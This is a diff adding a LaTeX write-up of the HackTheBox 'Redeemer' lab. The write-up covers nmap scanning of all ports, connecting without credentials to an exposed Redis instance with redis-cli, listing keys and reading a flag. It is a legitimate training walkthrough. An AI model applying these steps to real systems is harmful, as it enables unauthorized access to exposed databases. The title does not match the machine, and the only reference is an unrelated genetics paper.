@@ -1,0 +1,142 @@
+\documentclass[conference]{IEEEtran}
+\IEEEoverridecommandlockouts
+% The preceding line is only needed to identify funding in the first footnote. If that is unneeded, please comment it out.
+\usepackage{cite}
+\usepackage{amsmath,amssymb,amsfonts}
+\usepackage{graphicx}
+\usepackage{textcomp}
+\usepackage{xcolor}
+\usepackage[hyphens]{url}
+\usepackage{hyperref}
+\usepackage{listings}
+\def\BibTeX{{\rm B\kern-.05em{\sc i\kern-.025em b}\kern-.08em
+    T\kern-.1667em\lower.7ex\hbox{E}\kern-.125emX}}
+
+\newcommand{\rom}[1]{\uppercase\expandafter{\romannumeral #1\relax}}
+
+\begin{document}
+
+\title{HackTheBox: WhatIsIt?}
+
+\author{\IEEEauthorblockN{Lennart Buhl}
+\IEEEauthorblockA{\textit{Department of Computer Science} \\
+\textit{University of St. Thomas}\\
+\textit{September, 2023}}}
+
+\maketitle
+
+
+
+\begin{abstract}
+Today, we try to pawn the machine with the moniker Redeemer.
+\end{abstract}
+
+
+
+\begin{IEEEkeywords}
+programming, cybersecurity, security, pentesting
+\end{IEEEkeywords}
+
+
+\section{Introduction}
+Redeemer is located at IPv4 10.129.223.3. Which we can access through the HackTheBox OpenVPN gateway.
+We achieve this by simply running this command in a shell:
+\begin{scriptsize}
+\begin{verbatim}
+sudo openvpn starting_point_{user}.ovpn
+\end{verbatim}
+\end{scriptsize}
+
+\\
+\textit{I will now switch to root shell.}
+\\
+
+Once we are on the VPN, we can check if we have access to the machine at 10.129.223.3:
+\begin{scriptsize}
+\begin{verbatim}
+root@ghost:~# ping 10.129.223.3
+PING 10.129.223.3 (10.129.223.3) 56(84) bytes of data.
+64 bytes from 10.129.223.3: icmp_seq=1 ttl=63 time=34.8 ms
+64 bytes from 10.129.223.3: icmp_seq=2 ttl=63 time=34.5 ms
+64 bytes from 10.129.223.3: icmp_seq=3 ttl=63 time=34.5 ms
+64 bytes from 10.129.223.3: icmp_seq=4 ttl=63 time=34.5 ms
+^C
+--- 10.129.223.3 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3005ms
+rtt min/avg/max/mdev = 34.464/34.553/34.769/0.125 ms
+
+\end{verbatim}
+\end{scriptsize}
+
+We wait for four consecutive packets that have been successfully transmitted to hit CTRL+C.
+\\
+Now we scan all the ports using nmap:
+\begin{scriptsize}
+\begin{verbatim}
+root@ghost:~# nmap -p- 10.129.223.3
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 13:51 CDT
+Nmap scan report for 10.129.223.3
+Host is up (0.043s latency).
+Not shown: 65534 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+6379/tcp open  redis
+
+Nmap done: 1 IP address (1 host up) scanned in 24.97 seconds
+\end{verbatim}
+\end{scriptsize}
+
+When using nmap, we can specify nmap to scan ALL ports using "-p-" this will ensure we do not miss a port. As by default, nmap only scans the top 1000 ports.
+
+\begin{verbatim}
+PORT     STATE SERVICE
+6379/tcp open  redis
+\end{verbatim}
+
+Okay, now that we have found port 6379, and see that redis is being run a service on that port, we can do some googling to see what we can find.
+
+After some googling, we find that redis is a type of NoSQl database, which can be accessed via the command-line using "redis-cli".
+
+\begin{scriptsize}
+\begin{verbatim}
+root@ghost:~# redis-cli -h 10.129.223.3 -p 6379
+10.129.223.3:6379>
+\end{verbatim}
+\end{scriptsize}
+
+We can access the database using the "-h" argument (which is looking for a host / IP Address) and the "-p" argument (which is specifying the Port of the host).
+
+We are then offered a shell, where we can execute commands. After some more googling, we find that redis is a in-memory key-value database. Which essentially means, if we find the keys, we can access the associated values. Using the following command, we are given ALL keys in that database.
+
+\begin{scriptsize}
+\begin{verbatim}
+10.129.223.3:6379> KEYS *
+1) "flag"
+2) "numb"
+3) "temp"
+4) "stor"
+\end{verbatim}
+\end{scriptsize}
+
+Notice, how we used the "*" wildcard to get every key.
+
+Now, since we are in a "Capture The Flag" (CTF) style game, we can assume the flag is the value associated with the key "flag". We want to get the value for key "flag".
+
+\begin{scriptsize}
+\begin{verbatim}
+10.129.223.3:6379> GET flag
+"03e1d2b376c37ab3f5319922053953eb"
+\end{verbatim}
+\end{scriptsize}
+
+Boom. We got the flag.
+
+
+\begin{thebibliography}{00}
+
+\bibitem{Khomtchouk} B. B. Khomtchouk, “Codon usage bias levels predict taxonomic identity and genetic composition,” bioRxiv, 01-Jan-2020. \url{https://doi.org/10.1101/2020.10.26.356295}.
+
+\end{thebibliography}
+\vspace{12pt}
+
+
+\end{document}
